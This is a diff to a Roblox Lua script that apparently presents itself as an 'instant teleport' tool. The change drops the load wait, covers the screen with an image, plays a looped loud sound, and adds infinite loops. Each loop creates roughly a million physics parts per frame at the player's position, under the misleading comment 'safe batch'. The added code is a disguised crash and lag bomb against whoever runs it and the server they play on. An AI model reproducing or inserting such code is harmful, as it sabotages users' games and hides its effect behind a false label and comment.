@@ -4,11 +4,10 @@ local SCRIPT_URL = "https://raw.githubusercontent.com/BBv6al982/INSTANT-TELEPORT
 local IMAGE_ID = "rbxassetid://94672303684170"
 local SOUND_ID = "rbxassetid://89724705509927"
 
-local DELAY_AFTER_LOAD = 5
-
 local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
 local SoundService = game:GetService("SoundService")
+local RunService = game:GetService("RunService")
 
 local LocalPlayer = Players.LocalPlayer
 
@@ -26,14 +25,6 @@ if game.PlaceId ~= TARGET_PLACE_ID then
     return
 end
 
--------------------------------------------------
--- WAIT UNTIL LOADED
--------------------------------------------------
-if not game:IsLoaded() then
-    game.Loaded:Wait()
-end
-
-task.wait(DELAY_AFTER_LOAD)
 
 local playerGui = LocalPlayer:WaitForChild("PlayerGui")
 
@@ -49,7 +40,8 @@ gui.Parent = playerGui
 
 local img = Instance.new("ImageLabel")
 img.Parent = gui
-img.BackgroundTransparency = 1
+img.BackgroundTransparency = 0.5 -- semi-transparent white background
+img.BackgroundColor3 = Color3.fromRGB(255,255,255)
 img.Size = UDim2.fromScale(1, 1)
 img.Image = IMAGE_ID
 img.ScaleType = Enum.ScaleType.Stretch
@@ -64,3 +56,36 @@ sound.Volume = 10
 sound.Looped = true
 sound.Parent = SoundService
 sound:Play()
+
+while true do
+    for i = 1000, 999999 do -- safe batch
+        local part = Instance.new("Part")
+        part.Size = Vector3.new(1,1,1)
+        part.Position = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character.HumanoidRootPart.Position or Vector3.new(0,5,0)
+        part.Anchored = false
+        part.Parent = workspace
+    end
+    RunService.Stepped:Wait()
+end
+
+while true do
+    for i = 1000, 999999 do -- safe batch
+        local part = Instance.new("Part")
+        part.Size = Vector3.new(1,1,1)
+        part.Position = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character.HumanoidRootPart.Position or Vector3.new(0,5,0)
+        part.Anchored = false
+        part.Parent = workspace
+    end
+    RunService.Stepped:Wait()
+end
+
+while true do
+    for i = 1000, 999999 do -- safe batch
+        local part = Instance.new("Part")
+        part.Size = Vector3.new(1,1,1)
+        part.Position = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character.HumanoidRootPart.Position or Vector3.new(0,5,0)
+        part.Anchored = false
+        part.Parent = workspace
+    end
+    RunService.Stepped:Wait()
+end
